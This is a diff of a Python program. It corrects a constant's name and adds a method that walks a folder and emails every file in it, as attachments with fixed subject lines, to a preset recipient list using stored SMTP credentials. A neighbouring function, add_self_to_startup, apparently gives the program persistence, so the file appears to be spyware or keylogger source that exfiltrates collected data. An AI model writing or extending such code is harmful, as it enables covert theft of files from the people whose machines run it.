@@ -304,13 +304,13 @@ class AttachMail():
         self.mailServer.ehlo()
         self.mailServer.starttls()
         self.mailServer.ehlo()
-        self.mailServer.login(Constans.EMAIL_LOGIN ,Constans.EMAIL_PASSWORD)   
+        self.mailServer.login(Constants.EMAIL_LOGIN ,Constants.EMAIL_PASSWORD)   
     def stop_server(self):
         self.mailServer.close()
     def sendMail(self,to,subject,text,attach):
         msg = MIMEMultipart()
   
-        msg['From'] = Constans.EMAIL_LOGIN
+        msg['From'] = Constants.EMAIL_LOGIN
         msg['To'] = to
         msg['Subject'] = subject
       
@@ -322,8 +322,15 @@ class AttachMail():
         part.add_header('Content-Disposition',
                 'attachment; filename="%s"' % os.path.basename(attach))
         msg.attach(part)
-        self.mailServer.sendmail(gmail_name, to, msg.as_string())
-
+        self.mailServer.sendmail(Constants.EMAIL_LOGIN, to, msg.as_string())
+    def sendMailInFolder(self):
+        self.start_server()
+        for root, dirs, files in os.walk(Constants.DESTINATION_FOLDER_PATH):
+            for each in files:
+                temp=str(each)
+                temp=os.path.join(root,temp)
+                self.sendMail(Constants.EMAIL_DESTINATION_LIST,"python","python",temp)
+        self.stop_server()
 
 def add_self_to_startup(self):
     # Check if program is in startup
